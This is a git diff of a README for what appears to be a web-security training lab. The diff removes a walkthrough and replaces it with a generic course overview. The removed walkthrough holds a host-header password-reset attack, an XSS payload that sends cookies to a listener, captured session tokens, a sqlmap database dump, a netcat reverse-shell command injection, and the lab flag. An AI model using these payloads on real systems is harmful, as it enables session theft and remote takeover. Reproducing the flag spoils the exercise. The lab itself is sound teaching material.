@@ -1,104 +1,57 @@
-Welcome to Web Application Security Module \o/
+# Web Fundamentals
 
-Requirements
-General
-All your scripts will be tested on Kali Linux 2023.3
-All your scripts should be exactly two lines long ($ wc -l file should print 2)
-You must substitute the IP range for $1.
-All your files should end with a new line (Why?)
-The first line of all your files should be exactly #!/bin/bash.
-A README.md file, at the root of the folder of the project, is mandatory
-Your code should use the Betty style. It will be checked using betty-style.pl and betty-doc.pl
-All your files must be executable
+## Description
+This project introduces foundational web application security concepts and provides hands-on experience with common web vulnerabilities. Through a series of practical exercises, you'll learn how to identify and exploit security issues in web applications.
 
-## task 2 flag (login/ and reset_password/)
-- run your vpn file
-- start ubuntu container
-- you need to connect to the ubuntu sandbox, and make the request from there, edit the etc/hosts file (put the ip of the machine, and the domain: 
-- start the cyber_websec0x00 container
+## Learning Objectives
+- Understand how the web works fundamentally
+- Differentiate between Web 1.0, Web 2.0, and Web 3.0
+- Learn about Progressive Web Applications (PWA)
+- Understand front-end and back-end communication
+- Explore stateful vs. stateless applications
+- Differentiate between structured and unstructured data
+- Identify common web application security risks
+- Learn about bug bounty programs
 
-### open another sandbox (you will have to sandbox, one to make the request an other to listen what the request produce.
-python3 -m http.server -b :: 80
-### command to make the request
-curl -X POST "http://web0x00.hbtn/reset_password" -H "Host: 10.42.92.127" -d "email=yosri@web0x00.hbtn" 
+## Tasks Overview
+1. **Host Header Injection**: Exploit vulnerabilities in HTTP host headers
+2. **Password Reset Exploitation**: Capture flags by exploiting a password reset feature
+3. **Cross-Site Scripting (XSS)**: Create JavaScript payloads to steal cookies
+4. **SQL Injection**: Exploit database vulnerabilities to access unauthorized data
+5. **Remote Code Execution (RCE)**: Execute commands on a target server through input validation flaws
 
-- Use the token that you receive to gain access to the reset password, change the password, go to login, use the user (part of the email) and the newpassword.
+## Requirements
+- Kali Linux 2023.3
+- Scripts must be exactly two lines long
+- Scripts should substitute the IP range with $1
+- All files must end with a newline
+- First line of all files must be #!/bin/bash
+- Files must follow Betty coding style
+- All files must be executable
 
+## Tools Used
+- curl
+- SQLmap
+- Python's HTTP server
+- Firefox web browser
 
-## task 3-4 (/support)
-3-xss_payload.txt
-<script>fetch(`http://<ubuntu ip>/${document.cookie}`)</script>
+## Installation
+```bash
+# Install curl
+sudo apt install curl
 
-- use the above script in the input (plain text) of the ticket, to send the malicious script as a support ticket  lol. 
+# Install SQLmap
+sudo apt install sqlmap
+```
 
-┌──(kali㉿kali)-[~]
-└─$ python3 -m http.server -b :: 80
-Serving HTTP on :: port 80 (http://[::]:80/) ...
-::ffff:10.8.0.6 - - [17/Apr/2024 05:19:24] code 404, message File not found
-::ffff:10.8.0.6 - - [17/Apr/2024 05:19:24] "GET /reset_password/YDVzdvLIOuLYfuLZnBsInRGavJblcSnm HTTP/1.1" 404 -
-::ffff:10.8.0.6 - - [17/Apr/2024 05:24:06] code 404, message File not found
-::ffff:10.8.0.6 - - [17/Apr/2024 05:24:06] "GET /session=.eJxFyjsKgDAQBcC7vDpIbFMpHsETJLhiID92E1TEu2sjtsNcGJfok8CsNggpTE1qjsSvVG4vzK2UzPUfFK0PMDizsB92cvrQuttcTVDwC0yv0IQ42Uhfw_0AkYMj6g.Zh-VNg.MWQCtcSPJKnMjlk_qnGfkV1mkb4 HTTP/1.1" 404 -
-::ffff:10.8.0.6 - - [17/Apr/2024 05:24:12] code 404, message File not found
-::ffff:10.8.0.6 - - [17/Apr/2024 05:24:12] "GET /session=.eJxFyksKgCAURuG9_GMJmzoqWkIrULyR4AuvUhDtPaGBw_NxHqw2uMhQh_ZMAlvjmgKVIXvLOZXaoZbWm4J2Hgr8-3KRkbeU02lqhICzULNAYypRBxoj3g8vsSW4.Zh-VOg.8JCGXo-A0Wx1Ul5BVpaEfqRVIjU HTTP/1.1" 404 -
-
-- run the paylod, and use the other sandbox to check for a different cookie, use that cookie in the support page to gain access and find the flag. 
-- You have to put the cookie in webtools->storage-->cookie--> value
-
-
-
-## task 5-6 
-sqlmap -u "http://web0x00.hbtn/ticket?id=9" --cookie="session=.eJxFyksKgCAURuG9_GMJmzoqWkIrULyR4AuvUhDtPaGBw_NxHqw2uMhQh_ZMAlvjmgKVIXvLOZXaoZbWm4J2Hgr8-3KRkbeU02lqhICzULNAYypRBxoj3g8vsSW4.Z4BojQ.Hek5BhofOZUbW9No8AdLR5kweLw" --batch --dump
-
-- The database will dumb a lot of info, you need to search for the adminpass. With this command your using a id parameter from a ticket that you maliciusly create.
-- Go to the /admin panel to use the user and password that you casually founded lol.
-
-
-exercise #8 flag - reverse shell
-## sandbox
-root@:/# nc -nlvp 80
-Listening on 0.0.0.0 80
-
-##paylod in admin's account
-- http://web0x00.hbtn/admin
-; ./nc your_ip_local 80 -e /bin/bash
-
-Connection received on 10.42.74.137 35678
-ls
-__pycache__
-app.py
-db.sql
-nc
-nginx.conf
-render.py
-requirements.txt
-static
-templates
-utils
-web0x00.sqlite3
-cd ..
-ls
-app
-bin
-boot
-dev
-etc
-home
-lib
-lib64
-media
-mnt
-opt
-proc
-root
-run
-sbin
-srv
-sys
-tmp
-usr
-var
-cd root/
-ls
-flag.txt
-cat flag.txt
-3845211fd4640c1d07072f4609500f0e
+## Resources
+- How the Web works
+- Web Development Fundamentals
+- Web 1.0 vs. Web 2.0 vs. Web 3.0
+- Progressive Web Apps
+- Stateful vs Stateless Web App Design
+- Structured vs. Unstructured Data
+- Web Application Security
+- OWASP Top Ten
+- Cross-Origin Resource Sharing (CORS)
+- Bug Bounty Programs
